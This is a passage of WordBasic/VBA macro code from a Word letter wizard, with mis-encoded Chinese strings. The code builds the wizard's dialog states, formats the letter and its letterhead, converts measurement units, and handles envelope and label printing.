entire width\n        WordBasic.OKButton 41, 176, 73, 21  '2 -- Will never be seen! (o.w. it'd always be default)\n        WordBasic.PushButton 147, 170, 75, 20, \"\u00b4\u00a3\u00a5\u00dc(&H)\"   '3\n        WordBasic.CancelButton 205, 228, 75, 19 '4\n        WordBasic.PushButton 286, 228, 94, 19, \"<\u00a4W\u00a4@\u00a8B(&B)\"    '5\n        WordBasic.PushButton 380, 228, 94, 19, \"\u00a4U\u00a4@\u00a8B(&N)>\"    '6\n        WordBasic.PushButton 476, 228, 75, 19, \"\u00a7\u00b9\u00a6\u00a8(&F)\"   '7\n        WordBasic.FilePreview 7, 3, 240, 206, \"Preview\" '8\n        StateItems__(0) = 9 'Number of general (state-independent) controls\n\n    '%% Wizard-specific states go here %%\n    'State 1\n        WordBasic.Text 259, 9, 229, 19, \"\u00ba\u00eb\u00c6F\u00a5i\u00a5H\u00b3]\u00adp\u00a5X\u00bc\u00c6\u00ba\u00d8\u00ab\u00ac\u00a6\u00a1\u00aa\u00ba\u00ad^\u00a4\u00e5\u00abH\u00a5\u00f3\u00a1C\"\n        WordBasic.Text 269, 45, 104, 13, \"\u00b1z\u00b7Q\u00adn\u00a8\u00ba\u00a4@\u00c3\u00fe\u00aa\u00ba\u00abH\u00a5\u00f3?\"\n        WordBasic.OptionGroup \"LetterMethod\"\n            WordBasic.OptionButton 290, 84, 215, 16, \"\u00bc\u00b6\u00bcg\u00b0\u00d3\u00b7~\u00abH\u00a5\u00f3(&B)\", \"optlm2\"\n            WordBasic.OptionButton 290, 104, 215, 16, \"\u00bc\u00b6\u00bcg\u00a8p\u00a4H\u00abH\u00a5\u00f3(&P)\", \"optlm3\"\n        WordBasic.Text 307, 60, 208, 16, \"\", \"Text1\" 'Placeholder\n        WordBasic.Text 266, 145, 40, 13, kTip$, \"tip1\"\n        WordBasic.Text 315, 145, 208, 66, \" \", \"tip1text\"\n        ItemsInState 8  'Number of items in state\n    \n    'State 2: Letter options\n        WordBasic.Text 262, 20, 271, 19, \"\u00b1z\u00b7Q\u00b1N\u00ad\u00fe\u00a8\u00c7\u00b6\u00b5\u00a5\u00d8\u00a5[\u00a4J\u00abH\u00a5\u00f3\u00a4\u00a4?\"\n        WordBasic.CheckBox 286, 50, 214, 16, \"\u00ad\u00b6\u00bdX(&P)\", \"chkloPage\"\n        WordBasic.CheckBox 286, 70, 214, 16, \"\u00a4\u00e9\u00b4\u00c1(&D)\", \"chkloDate\"\n        WordBasic.CheckBox 286, 90, 251, 16, \"\u00b9q\u00a4l\u00b6l\u00a5\u00f3\u00b1b\u00b8\u00b9\u00a9\u00ce\u00a4\u00e5\u00a5\u00f3\u00c3\u00d1\u00a7O\u00bdX(&I)\", \"chkloID\"\n        WordBasic.CheckBox 286, 110, 214, 16, \"\u00bcg\u00abH\u00aa\u00cc\u00c3\u00b1\u00a6W(&W)\", \"chkloWriterInitials\"\n        WordBasic.CheckBox 286, 130, 214, 16, \"\u00a5\u00b4\u00a6r\u00aa\u00cc\u00c3\u00b1\u00a6W(&T)\", \"chkloTypistInitials\"\n        WordBasic.CheckBox 286, 150, 214, 16, \"\u00b0\u00c6\u00a5\u00bb(&C)\", \"chkloCC\"\n        WordBasic.CheckBox 286, 170, 214, 16, \"\u00c0H\u00a8\u00e7(&E)\", \"chkloEnclosures\"\n        WordBasic.CheckBox 286, 190, 214, 16, \"\u00aa\u00fe\u00a5\u00f3(&A)\", \"chkloAttachments\"\n        ItemsInState 9\n\n    'State 3\n        WordBasic.Text 277, 44, 230, 18, \"\u00b1z\u00adn\u00bf\u00ef\u00a8\u00fa\u00a6\u00f3\u00ba\u00d8\u00ae\u00e6\u00a6\u00a1\u00aa\u00ba\u00abH\u00a5\u00f3?\"\n        WordBasic.OptionGroup \"UseLetterhead\"\n            WordBasic.OptionButton 298, 68, 189, 16, \"\u00a7t\u00bc\u00d0\u00c0Y\u00aa\u00ba\u00abH\u00a5\u00f3(&L)\", \"LetterHeadYes\"\n            WordBasic.OptionButton 298, 88, 189, 16, \"\u00a4\u00a3\u00a7t\u00bc\u00d0\u00c0Y\u00aa\u00ba\u00abH\u00a5\u00f3(&P)\", \"LetterHeadNo\"\n        ItemsInState 4\n\n    'State 4\n        WordBasic.Text 267, 7, 273, 17, \"\u00b1z\u00adn\u00b1N\u00abH\u00a5\u00f3\u00bc\u00d0\u00c0Y\u00b3]\u00adp\u00a9\u00f1\u00a6b\u00ad\u00b6\u00ad\u00b1\u00a6\u00f3\u00b3B?\"\n        WordBasic.OptionGroup \"LetterHeadPosition\"\n            WordBasic.OptionButton 285, 30, 104, 16, \"\u00bea\u00a4W(&T)\", \"AtTheTop\"\n            WordBasic.OptionButton 285, 50, 109, 16, \"\u00bea\u00a5\u00aa(&L)\", \"OnTheLeft\"\n            WordBasic.OptionButton 285, 70, 119, 16, \"\u00bea\u00a5k(&R)\", \"OnTheRight\"\n        WordBasic.Text 267, 107, 262, 17, \"\u00abH\u00a5\u00f3\u00bc\u00d0\u00c0Y\u00b3]\u00adp\u00bb\u00dd\u00adn\u00a6h\u00a4j\u00aa\u00ba\u00b6\u00a1\u00b6Z(&S)?\"\n        WordBasic.TextBox 286, 125, 65, 18, \"textLetterheadSpace\"\n        WordBasic.Text 261, 172, 40, 13, kTip$, \"tip5\"\n        WordBasic.Text 306, 172, 220, 39, \" \", \"tip5text\"\n        ItemsInState 9\n\n    'State 5\n        WordBasic.Text 265, 9, 280, 12, \"\u00bf\u00e9\u00a4J\u00a6\u00ac\u00abH\u00a4H\u00b8\u00ea\u00ae\u00c6\u00a9\u00ce\u00a5\u00d1\u00b3q\u00b0T\u00bf\u00fd\u00a4\u00a4\u00bf\u00ef\u00a8\u00fa(&T):\"\n        WordBasic.TextBox 265, 46, 258, 67, \"textRecipientAddress\", 1\n        WordBasic.Text 265, 115, 115, 12, \"\u00b1H\u00abH\u00a4H\u00a6a\u00a7}(&Y):\"\n        WordBasic.TextBox 265, 152, 258, 56, \"textReturnAddress\", 1\n        WordBasic.PushButton 398, 24, 127, 21, \"\u00b3q\u00b0T\u00bf\u00fd(&A)...\", \"Push1\" '43\n        WordBasic.PushButton 398, 129, 127, 21, \"\u00b3q\u00b0T\u00bf\u00fd(&X)...\", \"Push2\" '44\n        ItemsInState 6\n        \n    'State 6\n        WordBasic.Text 258, 42, 300, 17, \"\u00b1z\u00b7Q\u00bf\u00ef\u00a5\u00ce\u00a6\u00f3\u00ba\u00d8\u00bc\u00cb\u00a6\u00a1?\"\n        WordBasic.OptionGroup \"WizStyle\"\n            WordBasic.OptionButton 278, 65, 200, 16, \"\u00a5j\u00a8\u00e5\u00a6\u00a1(&C)\"\n            WordBasic.OptionButton 278, 85, 200, 16, \"\u00b2{\u00a5N\u00a6\u00a1(&O)\"\n            WordBasic.OptionButton 278, 105, 200, 16, \"\u00bc\u00d0\u00b7\u00c7\u00a6\u00a1(&T)\"\n        ItemsInState 5\n\n    'State 7: Finish\n        WordBasic.Picture 0, 0, 269, 215, \"FlagPic\", 1, \"flag\"\n        WordBasic.Text 277, 60, 237, 20, \"\u00ba\u00eb\u00c6F\u00a4w\u00a7\u00b9\u00a6\u00a8\u00ab\u00d8\u00a5\u00df\u00abH\u00a5\u00f3\u00aa\u00ba\u00b8\u00df\u00b0\u00dd\u00bf\u00ef\u00b6\u00b5!\"\n        WordBasic.Text 289, 103, 212, 15, \"\u00abH\u00a5\u00f3\u00ab\u00d8\u00a5\u00df\u00a4\u00a7\u00ab\u00e1\u00b1z\u00c1\u00d9\u00b7Q\u00b0\u00b5\u00a4\u00b0\u00bb\u00f2?\"\n        WordBasic.OptionGroup \"HelpOrEnvelope\"\n            WordBasic.OptionButton 308, 126, 222, 14, \"\u00ab\u00d8\u00a5\u00df\u00abH\u00ab\u00ca\u00a9\u00ce\u00b6l\u00b1H\u00bc\u00d0\u00c5\u00d2(&C)\"\n            WordBasic.OptionButton 308, 146, 222, 16, \"\u00a5u\u00adn\u00c5\u00e3\u00a5\u00dc\u00abH\u00a5\u00f3\u00a7Y\u00a5i(&J)\"\n        ItemsInState 6 'Number of items in state\n        HideFilePreview__(LastState) = 1\n    WordBasic.EndDialog\nSet dlg = WordBasic.CurValues.UserDialog\n    \n    ' Set some default values\n    WordBasic.CurValues.ToolsOptionsUserInfo toui\n    gEnvelopeLabel = 0\n\n    'We're ready (finally!) to throw the wizard onto the screen:\n    If WordBasic.Dialog.UserDialog(dlg) = 0 Then\n        WordBasic.WaitCursor 1\n        WordBasic.ToolsOptionsGeneral BlueScreen:=gDoogie\n        WordBasic.WindowList (iWorkDoc) 'ensure work doc is in front for tests\n        If WordBasic.Window() <> iWorkDoc Then Exit Sub\n        WordBasic.DocClose 2 'Close the document(w/out saving)\n        If WordBasic.[WindowName$]() <> emptyDoc$ Then Exit Sub\n        WordBasic.DocClose 2 'Close the empty doc\n    Else\n        WordBasic.WaitCursor 1\n        WordBasic.ToolsOptionsGeneral BlueScreen:=gDoogie\n        WordBasic.WindowList (iWorkDoc) 'ensure work doc is in front\n        WordBasic.ScreenUpdating -1\n        If gEnvelopeLabel Then\n            If WordBasic.ExistingBookmark(\"recipAddr\") <> 0 Then WordBasic.WW7_EditGoTo \"recipAddr\"\n            dlgEL.ExtractAddress = 0\n            x = WordBasic.Dialog.ToolsEnvelopesAndLabels(dlgEL) 'we already setup dlgEL (see below)\n            If dlgEL.AddrText = \"\" Then\n                faddr = dlgEL.EnvAddress\n            Else\n                faddr = dlgEL.AddrText\n            End If\n            If dlgEL.RetAddrText = \"\" Then\n                freaddr = dlgEL.EnvReturn\n            Else\n                freaddr = dlgEL.RetAddrText\n            End If\n            Select Case x\n                Case 1\n                    If dlgEL.Tab <> \"0\" Then\n                        Application.MailingLabel.DefaultPrintBarCode = False\n                        Application.MailingLabel.PrintOut Address:=faddr\n                    Else\n                        ActiveDocument.Envelope.PrintOut ExtractAddress:=dlgEL.ExtractAddress, Address:=faddr, returnAddress:=freaddr\n                    End If\n                    ' need to print a document\n                Case 2\n                    If dlgEL.Tab <> \"0\" Then\n                        Application.MailingLabel.DefaultPrintBarCode = False\n                        Application.MailingLabel.CreateNewDocument Address:=faddr\n                    Else\n                        ActiveDocument.Envelope.Insert ExtractAddress:=dlgEL.ExtractAddress, Address:=faddr, returnAddress:=freaddr\n                    End If\n                    ' need to do a WindowList(iWorkDoc) here..\n                Case Else\n                    'do nothing\n            End Select\n            If WordBasic.ExistingBookmark(\"letterbody\") <> 0 Then\n                WordBasic.WW7_EditGoTo \"letterbody\"\n                WordBasic.LineDown 1, 1\n            End If\n        End If\n        WordBasic.FileTemplates Store:=0, Template:=Normal_$, LinkStyles:=0\n        'WindowNumber changes when user selects Envelops and Labels since in some languages it is opened as \"address\" and comes before empty doc.\n        iWindowNumber = 1\n        While (iWindowNumber <= WordBasic.CountWindows())\n            If (WordBasic.[WindowName$](iWindowNumber) = emptyDoc$) Then\n                WordBasic.WindowList (iWindowNumber)\n                WordBasic.DocClose 2\n            End If\n            iWindowNumber = iWindowNumber + 1\n        Wend\n        \n    End If\n    'All done!\n    WordBasic.ScreenUpdating -1\n    \nEnd Sub '%% StartWizard\n\n'======================================================\n'%% Wizard-specific routines\n\nPrivate Sub GetPrewrittenDetails()\nDim def$\nDim path$\nDim i\n    WordBasic.PrintStatusBar kLookingForLetters$\n    def$ = WordBasic.[GetDocumentVar$](\"LetterName\")\n    defLttr = -1\n    path$ = xFetchPref$(kLetterPath$) 'Has this been defined in wordwiz.ini??\n    If path$ = \"\" Then path$ = WordBasic.[GetProfileString$](kLetterPath$) '..How about in win.ini/winword6.ini?\n    If path$ = \"\" Then 'No, so assume they're in subdir of program directory\n        path$ = WordBasic.[DefaultDir$](9) 'get program directory\n\n        If path$ <> \"\" Then\n            If WordBasic.[Right$](path$, 1) <> \"\\\" Then path$ = path$ + \"\\\"\n            path$ = path$ + kLettersDir$        'letters subdirectory\n            If WordBasic.[Files$](path$ + \"*.*\") = \"\" Then path$ = WordBasic.[Left$](path$, Len(path$) - 8)\n        Else\n            path$ = WordBasic.[Files$](\".\")         'this is the best we can do\n        End If\n    End If\n    If WordBasic.[Right$](path$, 1) <> \"\\\" Then path$ = path$ + \"\\\"\n    LettersPath$ = path$\n    WordBasic.PrintStatusBar kLoadingLetterDetails$\nLExit:\nEnd Sub\n\nPrivate Function GetDefaultUnits()\n    Dim dlgTO As Object: Set dlgTO = WordBasic.DialogRecord.ToolsOptionsGeneral(False)\n    WordBasic.CurValues.ToolsOptionsGeneral dlgTO\n    GetDefaultUnits = dlgTO.Units\nEnd Function\n\nPrivate Function UnitName$(unit)\n    Select Case unit\n        Case 0\n            UnitName$ = \"\u00ad^\u00a6T\"\n        Case 1\n            UnitName$ = \"\u00a4\u00bd\u00a4\u00c0\"\n        Case 2\n            UnitName$ = \"\u00c2I\u00bc\u00c6\"\n        Case 3\n            UnitName$ = \"pi\"\n        Case Else\n            UnitName$ = \"\"\n            WordBasic.PrintStatusBar \"Unknown units!\" 'debug only\n    End Select\nEnd Function\n\nPrivate Function ConvertInchesToUnits(oldVal, newUnits)\nDim newVal\n    Select Case newUnits\n        Case 0: 'inches\n            newVal = oldVal\n        Case 1: 'cm\n            newVal = oldVal * 2.54\n        Case 2: 'pts\n            newVal = oldVal * 72\n        Case 3: 'pi\n            newVal = oldVal * 6\n        Case Else\n            newVal = oldVal\n            WordBasic.PrintStatusBar \"Unknown units!\"\n    End Select\n    ConvertInchesToUnits = newVal\nEnd Function\n\nPrivate Function ConvertUnitsToInches(oldVal, oldUnits)\nDim newVal\n    Select Case oldUnits\n        Case 0:     'inches\n            newVal = oldVal\n        Case 1:   'cm\n            newVal = oldVal / 2.54\n        Case 2: 'pts\n            newVal = oldVal / 72\n        Case 3: 'pi\n            newVal = oldVal / 6\n        Case Else\n            newVal = oldVal\n            WordBasic.PrintStatusBar \"Unknown units!\"\n    End Select\n    ConvertUnitsToInches = newVal\nEnd Function\n\nPrivate Function PrettyMeasurement$(theVal, theUnits)\nDim v\nDim u$\n    If (theVal < 11) Then v = WordBasic.Int(theVal * 2 + 0.5) / 2 Else v = WordBasic.Int(theVal)\n    u$ = UnitName$(theUnits)\n    If theUnits > 0 Then u$ = \" \" + u$\n    PrettyMeasurement$ = WordBasic.[LTrim$](Str(v)) + u$\nEnd Function\n        \nRem This function assumes input is in inches\nPrivate Function RightDistanceToLeftDistance$(fromEdgeInches)\nDim fromEdgeDef\n    Dim dlgPg As Object: Set dlgPg = WordBasic.DialogRecord.FilePageSetup(False)\n    WordBasic.CurValues.FilePageSetup dlgPg\n    fromEdgeDef = ConvertInchesToUnits(fromEdgeInches, GetDefaultUnits)\n    RightDistanceToLeftDistance$ = Str(WordBasic.Val(dlgPg.PageWidth) - WordBasic.Val(dlgPg.LeftMargin) - WordBasic.Val(dlgPg.RightMargin) - fromEdgeDef)\nEnd Function\n\nPrivate Sub InsertRedSlot(s$)   'DAPFEL, Changed to a MacroButton\n                        'MUST HAVE EmptyMacro macro in .wiz template\n    WordBasic.ToolsOptionsView FieldCodes:=1\n    WordBasic.InsertField Field:=kMacroButton$\n    WordBasic.CharLeft 1\n    WordBasic.Insert kEmptyMacro$\n    WordBasic.Insert \"[\"\n    WordBasic.Insert s$\n    WordBasic.Insert \"]\"\n    WordBasic.CharRight 1\n    WordBasic.ToolsOptionsView FieldCodes:=0\nEnd Sub\n\nPrivate Sub SubstituteBananas()\nDim v$\nDim letterIndex\nDim ii\n    DoStyleMerge\n    If WordBasic.ExistingBookmark(\"bkAddress\") Then\n        WordBasic.EditBookmark Name:=\"bkAddress\", GoTo:=1\n'If recipient address is same as default address(AT entry) then insert boilerplates\n        v$ = WordBasic.[DlgText$](\"textRecipientAddress\")\n        If v$ <> kAddressATEntry$ Then\n            If v$ <> \"\" Then\n                WordBasic.Insert v$\n            Else\n                WordBasic.EditClear 'not able to replace selected text with empty string. Text remains unchanged.\n            End If\n        Else\n            InsertRedSlot kRecipient$\n            WordBasic.InsertPara\n            InsertRedSlot kEnterRecipientAddress$\n        End If\n    End If\n\n    If WordBasic.ExistingBookmark(\"Date\") Then\n        WordBasic.EditBookmark Name:=\"Date\", GoTo:=1\n        WordBasic.InsertDateTime kFormalDateFormat$\n    End If\n    If WordBasic.ExistingBookmark(\"bkReturnAddress\") Then\n        WordBasic.EditBookmark Name:=\"bkReturnAddress\", GoTo:=1\n        WordBasic.WW6_EditClear\n        If WordBasic.DlgValue(\"UseLetterhead\") = 1 Then\n            WordBasic.EditBookmark \"bkReturnAddress\" 'Plain Paper\n        Else\n            WordBasic.WW6_EditClear 'Remove Paragraph mark\n        End If\n    End If\n    \n    If WordBasic.ExistingBookmark(\"bkCompany\") Then\n        WordBasic.EditBookmark Name:=\"bkCompany\", GoTo:=1\n        WordBasic.WW6_EditClear\n\n        If WordBasic.DlgValue(\"UseLetterhead\") = 1 Then\n            WordBasic.EditBookmark \"bkCompany\" 'Plain Paper\n        Else\n            WordBasic.WW6_EditClear 'Remove Paragraph mark\n        End If\n    End If\n\n    If WordBasic.DlgValue(\"UseLetterhead\") = 1 Then\n        If WordBasic.ExistingBookmark(\"bkCompany\") Then\n            WordBasic.Style kStyCmpnyName$\n            WordBasic.EditBookmark Name:=\"bkCompany\", GoTo:=1\n            InsertRedSlot kTypeCompanyName$\n        End If\n        If (WordBasic.DlgValue(\"WizStyle\") = 1) Then\n            WordBasic.WW7_EditAutoText Name:=\"cntmpgfx2\", Insert:=1\n        'An extra line is introduced with the insertion of AT Entry. Does not affect Resume cover letter and letter to mom, because you do not have \"Company Name\" style\n            WordBasic.CharRight 1, 1\n            WordBasic.WW6_EditClear\n        Else\n            WordBasic.InsertPara\n        End If 'Wizstyle=1\n        \n        WordBasic.EditBookmark Name:=\"bkReturnAddress\", GoTo:=1\n        WordBasic.Style kStyRetAddr$\n        ParseRetAddress\n        If (WordBasic.DlgValue(\"WizStyle\") <> 2) Then ' Cntmp or Prof let style\n            For ii = 0 To 3\n                If (RetAddress__$(ii) <> \"\") Then\n                    WordBasic.Insert RetAddress__$(ii) + Chr(13)\n                Else\n                    WordBasic.Insert Chr(13)\n                End If 'RetAddress...\n            Next ii\n            If RetAddress__$(4) <> \"\" Then WordBasic.Insert RetAddress__$(4)\n        Else 'elegant style\n            For ii = 0 To 3\n                If (RetAddress__$(ii) <> \"\") Then\n                    WordBasic.Insert RetAddress__$(ii) + \" \u00a1E \"\n                Else\n                    'Do Nothing\n                End If 'RetAddress...\n            Next ii\n            If RetAddress__$(4) <> \"\" Then\n                WordBasic.Insert RetAddress__$(4)\n            Else\n                WordBasic.WW6_EditClear -3 'get rid of last bullet\n            End If\n        End If\n    End If 'LetterHead\n\n    If WordBasic.ExistingBookmark(\"bkName\") Then\n        WordBasic.EditBookmark Name:=\"bkName\", GoTo:=1\n        InsertRedSlot kName$\n    End If\n\n    If WordBasic.ExistingBookmark(\"bkName2\") Then\n        WordBasic.EditBookmark Name:=\"bkName2\", GoTo:=1\n        If toui.Name <> \"\" Then\n            WordBasic.Insert toui.Name\n        Else\n            InsertRedSlot kName$\n        End If\n    End If\nLDone:\nEnd Sub\n\n\n\n\n\nPrivate Sub SetAddress(nm)\nDim AddressText$\nDim ix\nDim iy\nDim Ltemp$\nDim Rtemp$\n    On Error GoTo -1: On Error GoTo ErrorSetAddress\n    AddressText$ = WordBasic.[GetAddress$](\"\", \"\", 0, 1, 0, 0, (nm - 1), 1)\n    If AddressText$ = \"\" Then GoTo SetAddressContinue\n    ix = InStr(1, AddressText$, Chr(11))\n    While ix <> 0\n        iy = Len(AddressText$)\n        Ltemp$ = WordBasic.[Left$](AddressText$, (ix - 1))\n        Rtemp$ = WordBasic.[Right$](AddressText$, (iy - ix))\n        AddressText$ = Ltemp$ + Chr(13) + Rtemp$\n        ix = InStr(1, AddressText$, Chr(11))\n    Wend\n    iy = Len(AddressText$)\n    ix = InStr(iy, AddressText$, Chr(13))\n    While ix = iy\n        AddressText$ = WordBasic.[Left$](AddressText$, (iy - 1))\n        iy = Len(AddressText$)\n        ix = InStr(iy, AddressText$, Chr(13))\n    Wend\n    If nm = 1 Then\n        WordBasic.DlgText \"textRecipientAddress\", AddressText$\n    ElseIf nm = 2 Then\n        WordBasic.DlgText \"textReturnAddress\", AddressText$\n    Else\n        'shouldn't happen\n    End If 'nm\n    GoTo SetAddressContinue\nErrorSetAddress:\n    'Only after getting the first MAPI load error, CommandValid (\"InsertAddress\") returns 0\n    If nm = 1 Then 'If error is due to MAPI loading, disable buttons\n        WordBasic.DlgFocus 43\n        WordBasic.DlgEnable 46, 0 - WordBasic.CommandValid(kInsertAddress$)\n        WordBasic.DlgEnable 47, 0 - WordBasic.CommandValid(kInsertAddress$)\n    Else\n        WordBasic.DlgFocus 45\n        WordBasic.DlgEnable 47, 0 - WordBasic.CommandValid(kInsertAddress$)\n        WordBasic.DlgEnable 46, 0 - WordBasic.CommandValid(kInsertAddress$)\n    End If\n    On Error GoTo -1: On Error GoTo 0\nSetAddressContinue:\nEnd Sub 'SetAddress\n\nPrivate Function RmTrailingLFs$(tString$) 'nukes extra returns in a string\nDim iy\nDim ix\n    iy = Len(tString$)\n    If iy = 0 Then GoTo EndOfRmTrailingLFs\n    ix = InStr(iy, tString$, Chr(13))\n    While ix = iy\n        tString$ = WordBasic.[Left$](tString$, (iy - 1))\n        iy = Len(tString$)\n        ix = InStr(iy, tString$, Chr(13))\n    Wend\nEndOfRmTrailingLFs:\n    RmTrailingLFs$ = tString$\nEnd Function\n\nPrivate Sub TwoPageHack(num) 'Hacks in a 2nd page header/footer\n    WordBasic.WW7_InsertPageBreak\n    WordBasic.EndOfDocument\n    WordBasic.FilePageSetup DifferentFirstPage:=1\n    If num = 1 Then\n        WordBasic.ViewHeader\n        If (WordBasic.DlgValue(\"WizStyle\") <> 2) Then\n            WordBasic.Insert Chr(9) + Chr(9)\n        Else\n            WordBasic.Insert Chr(9)\n        End If\n        WordBasic.InsertDateTime kFormalDateFormat$\n        WordBasic.ViewNormal\n    End If\n    If num = 2 Then\n        WordBasic.ViewFooter\n        If (WordBasic.DlgValue(\"WizStyle\") <> 2) Then\n            WordBasic.Insert Chr(9) + Chr(9)\n            WordBasic.InsertPageField\n        Else\n            WordBasic.Insert Chr(9)\n            WordBasic.Insert Chr(150) + \" \"\n            WordBasic.InsertPageField\n            WordBasic.Insert \" \" + Chr(150)\n        End If\n        WordBasic.ViewNormal\n    End If\n    WordBasic.EditSelectAll\n    WordBasic.WW6_EditClear\nEnd Sub\n\nPrivate Sub CreateLetter()\nDim recpAddress$\nDim returnAddress$\nDim T$\nDim DateTabPlace$\nDim ii\n    WordBasic.PrintStatusBar kCreatingDoc$\n    WordBasic.WaitCursor 1\n    ' branch on letter type : shrinkwrapped or original\n    recpAddress$ = WordBasic.[DlgText$](\"textRecipientAddress\")\n    If (recpAddress$ <> \"\") Then WordBasic.DlgText \"textRecipientAddress\", RmTrailingLFs$(recpAddress$)\n    returnAddress$ = WordBasic.[DlgText$](\"textReturnAddress\")\n    If (returnAddress$ <> \"\") Then WordBasic.DlgText \"textReturnAddress\", RmTrailingLFs$(returnAddress$)\n\nRem ****************************************************\n\n    If WordBasic.DlgValue(\"chkloDate\") <> 0 Then\n        TwoPageHack (1) 'Hacks in a 2nd page header/footer\n    End If\n    If WordBasic.DlgValue(\"chkloPage\") <> 0 Then\n        TwoPageHack (2)\n        WordBasic.ViewFooter\n        Select Case WordBasic.DlgValue(\"WizStyle\")\n            Case 2\n                WordBasic.Insert Chr(9)\n                WordBasic.Insert Chr(150) + \" \"\n                WordBasic.InsertPageField\n                WordBasic.Insert \" \" + Chr(150)\n            Case 1\n                WordBasic.Insert Chr(9) + Chr(9)\n                WordBasic.InsertPageField\n            Case 0\n                WordBasic.Font kFntWndngs$\n                WordBasic.Insert kDfltPageNum$\n                WordBasic.Font kFntArial$\n                WordBasic.Insert kPage$\n                WordBasic.InsertPageField\n        End Select\n        WordBasic.ViewNormal\n    End If\n    If (WordBasic.DlgValue(\"WizStyle\") = 1) And (WordBasic.DlgValue(\"chkloPage\") = 0) Then\n        WordBasic.ViewFooter\n        WordBasic.Insert \" \"\n        WordBasic.ViewNormal\n    End If\n    ' this is code for original letters\n    WordBasic.EditSelectAll\n    WordBasic.WW6_EditClear\n    If WordBasic.DlgValue(\"UseLetterhead\") = 0 Then\n        T$ = WordBasic.[DlgText$](\"textLetterheadSpace\")\n        On Error GoTo -1: On Error GoTo LBadMeasurement\n        Select Case WordBasic.DlgValue(\"LetterHeadPosition\")\n            Case 0  ' at the top\n                WordBasic.FilePageSetup TopMargin:=T$\n            Case 1    ' on the left\n                WordBasic.FilePageSetup LeftMargin:=T$\n            Case 2  ' on the right\n                WordBasic.FilePageSetup RightMargin:=T$\n        End Select\n        GoTo LDoneLetterhead\nLBadMeasurement:\n        WordBasic.DlgFilePreview emptyDoc$\n        WordBasic.DocClose 2 'Close the working document(w/out saving)\n        Stop\nLDoneLetterhead:\n        On Error GoTo -1: On Error GoTo 0\n    End If\n    WordBasic.InsertPara\n'Hey, this would be a good time to figure out where the return address/date should go:\n    DateTabPlace$ = RightDistanceToLeftDistance$(rtDistToLftDist) '1.25\" from the right is what?\n    'InsertPara'we're starting *after* return address/date (if included)\n    If WordBasic.DlgValue(11) <> 1 Then 'it's not a personal letter\n        WordBasic.EditBookmark \"recipaddr\", Add:=1\n        WordBasic.Style kStyInsideAddr$\n        WordBasic.Insert WordBasic.[DlgText$](\"textRecipientAddress\") 'includes name\n        WordBasic.InsertPara\n    'InsertPara  DAPFEL removed\n    End If\n    WordBasic.Style kStySal$\n    WordBasic.Insert kDear$ '+ DlgText$(\"textRecipientName\")\n    WordBasic.EditBookmark \"recipient\", Add:=1\n    InsertRedSlot kRecipient$\n    'lenrecip = Len(kRecipient$) + 2    ' 2 for [, ]\n    If WordBasic.DlgValue(11) = 1 Then WordBasic.Insert \",\" Else WordBasic.Insert \":\"\n    WordBasic.InsertPara\n    If WordBasic.DlgValue(\"chkloID\") And (WordBasic.DlgValue(11) <> 1) Then\n        WordBasic.Style kStySubjLine$\n        WordBasic.Insert kRE$\n        InsertRedSlot kAccountID$\n        WordBasic.InsertPara\n    End If\n    WordBasic.Style kStyBodyText$\n    WordBasic.EditBookmark \"letterbody\", Add:=1\n    InsertRedSlot kTypeHere$\n    WordBasic.InsertPara\n    WordBasic.FormatTabs ClearAll:=1\n    WordBasic.FormatTabs Position:=DateTabPlace$, Set:=1\n    WordBasic.Style \"\u00b5\u00b2\u00bby\"\n    If WordBasic.DlgValue(11) = 1 Then WordBasic.Insert kClosePersonal$ Else WordBasic.Insert kCloseBusiness$\n    WordBasic.InsertPara    'space for writer's name\n    If WordBasic.DlgValue(11) <> 1 Then 'if not personal\n        WordBasic.InsertPara\n        WordBasic.Style kStyRefIntls$\n        If WordBasic.DlgValue(\"chkloWriterInitials\") Then\n            InsertRedSlot kWritersInitials$\n            If WordBasic.DlgValue(\"chkloTypistInitials\") Then WordBasic.Insert \"/\" Else WordBasic.InsertPara\n        End If\n        If WordBasic.DlgValue(\"chkloTypistInitials\") Then\n            InsertRedSlot kTypistsInitials$\n            WordBasic.InsertPara\n        End If\n        If WordBasic.DlgValue(\"chkloCC\") Then\n            WordBasic.Style kStyCC$\n            WordBasic.Insert kCC$\n            InsertRedSlot kNames$\n            WordBasic.InsertPara\n        End If\n        WordBasic.Style kStyEncl$\n        If WordBasic.DlgValue(\"chkloEnclosures\") Then\n            WordBasic.Insert kEnclosures$\n            InsertRedSlot kNumber$\n            WordBasic.InsertPara\n        End If\n        If WordBasic.DlgValue(\"chkloAttachments\") Then\n            WordBasic.Insert kAttachments$ + Chr(13)\n        End If\n    End If 'not personal\n    WordBasic.StartOfDocument  ' go back to the start\n    If WordBasic.DlgValue(\"LetterMethod\") = 1 Then 'Personal\n        If WordBasic.DlgValue(\"WizStyle\") = 1 Then 'Contemporary Style\n            WordBasic.WW7_EditAutoText Name:=\"cntmpgfx2\", Insert:=1\n            WordBasic.StartOfDocument\n        End If 'Contemporary Style\n    Else 'if not personal\n        If WordBasic.DlgValue(\"UseLetterhead\") = 1 Then\n            WordBasic.Style kStyCmpnyName$\n            InsertRedSlot kTypeCompanyName$\n            If (WordBasic.DlgValue(\"WizStyle\") = 1) Then\n                WordBasic.WW7_EditAutoText Name:=\"cntmpgfx2\", Insert:=1\n                WordBasic.Style kStyCmpnyName$\n            Else\n                WordBasic.InsertPara\n            End If 'Wizstyle=1\n            WordBasic.Style kStyRetAddr$\n            ParseRetAddress\n            If (WordBasic.DlgValue(\"WizStyle\") <> 2) Then ' Cntmp or Prof let style\n                For ii = 0 To 3\n                    If (RetAddress__$(ii) <> \"\") Then\n                        WordBasic.Insert RetAddress__$(ii) + Chr(13)\n                    Else\n                        WordBasic.Insert Chr(13)\n                    End If 'RetAddress...\n                Next ii\n                If RetAddress__$(4) <> \"\" Then WordBasic.Insert RetAddress__$(4)\n            Else 'elegant style\n                For ii = 0 To 3\n                    If (RetAddress__$(ii) <> \"\") Then\n                        WordBasic.Insert RetAddress__$(ii) + \" \u00a1E \"\n                    Else\n                        'Do Nothing\n                    End If 'RetAddress...\n                Next ii\n                If RetAddress__$(4) <> \"\" Then\n                    WordBasic.Insert RetAddress__$(4)\n                Else\n                    WordBasic.WW6_EditClear -3 'get rid of last bullet\n                End If\n            End If\n        End If 'LetterHead\n    End If 'NotPersonal\n    If WordBasic.DlgValue(\"chkloDate\") = 1 Then\n        WordBasic.Insert Chr(13)\n        WordBasic.Style kStyDate$\n        WordBasic.InsertDateTime kFormalDateFormat$\n    End If\nLPrewrittenContinue:\n    WordBasic.StartOfDocument\n    WordBasic.ViewPage\n    WordBasic.ViewZoom AutoFit:=1\n    If 